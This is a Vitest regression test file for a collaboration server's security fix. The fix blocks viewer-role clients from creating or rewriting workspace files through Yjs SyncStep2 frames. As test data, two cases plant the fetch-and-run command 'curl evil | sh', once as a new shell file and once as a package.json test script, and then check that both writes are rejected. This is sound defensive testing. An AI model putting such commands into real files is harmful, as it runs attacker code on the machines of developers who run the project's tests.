/**
 * M86 security — viewers are read-only on the collaboration transport.
 *
 * The room dropped `messageYjsUpdate` frames from viewers but still applied
 * `messageYjsSyncStep2`. A step2 frame is just a Yjs update, so a viewer could
 * create, rewrite, or delete workspace files (the room persists them to disk,
 * where an editor's Run/Test then executes them). A viewer also
 * receives the full document on connect, so it can target existing content.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import type { WebSocket } from "ws";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import * as Y from "yjs";
import * as encoding from "lib0/encoding";
import * as decoding from "lib0/decoding";
import * as syncProtocol from "y-protocols/sync";
import { openDb, type Db } from "../src/db.js";
import { resolveConfig } from "../src/config.js";
import { CollaborationRoom } from "../src/collab/manager.js";
import { CollaborationHistorian } from "../src/collab/historian.js";

const MESSAGE_SYNC = 0;

function step2Frame(doc: Y.Doc): Uint8Array {
  const enc = encoding.createEncoder();
  encoding.writeVarUint(enc, MESSAGE_SYNC);
  syncProtocol.writeSyncStep2(enc, doc);
  return encoding.toUint8Array(enc);
}

function step1Frame(doc: Y.Doc): Uint8Array {
  const enc = encoding.createEncoder();
  encoding.writeVarUint(enc, MESSAGE_SYNC);
  syncProtocol.writeSyncStep1(enc, doc);
  return encoding.toUint8Array(enc);
}

function makeWs() {
  const sent: Uint8Array[] = [];
  return {
    readyState: 1,
    send: (d: Uint8Array) => sent.push(d),
    close: () => {},
    sent,
  } as unknown as WebSocket & { sent: Uint8Array[] };
}

function syncTypesSent(ws: { sent: Uint8Array[] }): number[] {
  const out: number[] = [];
  for (const buf of ws.sent) {
    try {
      const dec = decoding.createDecoder(buf);
      if (decoding.readVarUint(dec) !== MESSAGE_SYNC) continue;
      out.push(decoding.readVarUint(dec));
    } catch {
      /* not a sync frame */
    }
  }
  return out;
}

describe("M86 viewers cannot write through SyncStep2", () => {
  let db: Db;
  let tmp: string;
  let dir: string;
  let room: CollaborationRoom;
  let historian: CollaborationHistorian;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "m86-viewer-"));
    db = openDb(":memory:");
    db.prepare(
      "INSERT INTO users (id,username,password_hash) VALUES (1,'owner','h'),(2,'viewer','h')",
    ).run();
    db.prepare("INSERT INTO projects (id,owner_id,name) VALUES ('p',1,'P')").run();
    const cfg = { ...resolveConfig(), workspacesDir: tmp, dataDir: tmp };
    dir = join(tmp, "p");
    mkdirSync(dir, { recursive: true });
    const Ctor = CollaborationHistorian as unknown as { new (): CollaborationHistorian };
    historian = new Ctor();
    historian.init(db, cfg);
    room = new CollaborationRoom("p", cfg, db, () => {}, {}, historian);
  });

  afterEach(() => {
    room.dispose();
    historian.stop();
    rmSync(tmp, { recursive: true, force: true });
  });

  it("a viewer's SyncStep2 cannot create a file", async () => {
    const ws = makeWs();
    await room.addClient(ws, { userId: 2, username: "viewer", role: "viewer" });
    const evil = new Y.Doc();
    evil.getText("planted.sh").insert(0, "curl evil | sh\n");

    room.handleMessage(ws, step2Frame(evil));
    await room.flushToDisk();

    expect(room.doc.share.has("planted.sh")).toBe(false);
    expect(existsSync(join(dir, "planted.sh"))).toBe(false);
  });

  it("a viewer's SyncStep2 cannot rewrite existing content it was sent on connect", async () => {
    const editorWs = makeWs();
    await room.addClient(editorWs, { userId: 1, username: "owner", role: "editor" });
    const editorDoc = new Y.Doc();
    editorDoc.getText("package.json").insert(0, '{"scripts":{"test":"node --test"}}');
    room.handleMessage(editorWs, step2Frame(editorDoc));
    await room.flushToDisk();
    const original = readFileSync(join(dir, "package.json"), "utf8");

    const viewerWs = makeWs();
    await room.addClient(viewerWs, { userId: 2, username: "viewer", role: "viewer" });
    // The viewer holds the server's structs, so its delete targets them.
    const viewerDoc = new Y.Doc();
    Y.applyUpdate(viewerDoc, Y.encodeStateAsUpdate(room.doc));
    const t = viewerDoc.getText("package.json");
    t.delete(0, t.length);
    t.insert(0, '{"scripts":{"test":"curl evil | sh"}}');

    room.handleMessage(viewerWs, step2Frame(viewerDoc));
    await room.flushToDisk();

    expect(room.doc.getText("package.json").toString()).toBe(original);
    expect(readFileSync(join(dir, "package.json"), "utf8")).toBe(original);
  });

  it("an editor demoted to viewer is blocked the same way", async () => {
    const ws = makeWs();
    await room.addClient(ws, { userId: 2, username: "viewer", role: "editor" });
    room.updateUserRole(2, "viewer");
    const doc = new Y.Doc();
    doc.getText("after-demotion.txt").insert(0, "no\n");

    room.handleMessage(ws, step2Frame(doc));

    expect(room.doc.share.has("after-demotion.txt")).toBe(false);
  });

  it("a viewer can still read: its SyncStep1 is answered with the document", async () => {
    const editorWs = makeWs();
    await room.addClient(editorWs, { userId: 1, username: "owner", role: "editor" });
    const editorDoc = new Y.Doc();
    editorDoc.getText("readme.md").insert(0, "hello\n");
    room.handleMessage(editorWs, step2Frame(editorDoc));

    const viewerWs = makeWs();
    await room.addClient(viewerWs, { userId: 2, username: "viewer", role: "viewer" });
    viewerWs.sent.length = 0;
    room.handleMessage(viewerWs, step1Frame(new Y.Doc()));

    expect(syncTypesSent(viewerWs)).toContain(syncProtocol.messageYjsSyncStep2);
  });

  it("an editor's SyncStep2 re-seed is still applied", async () => {
    writeFileSync(join(dir, "keep.txt"), "");
    const ws = makeWs();
    await room.addClient(ws, { userId: 1, username: "owner", role: "editor" });
    const doc = new Y.Doc();
    doc.getText("keep.txt").insert(0, "editor content\n");

    room.handleMessage(ws, step2Frame(doc));
    await room.flushToDisk();

    expect(readFileSync(join(dir, "keep.txt"), "utf8")).toBe("editor content\n");
  });
});
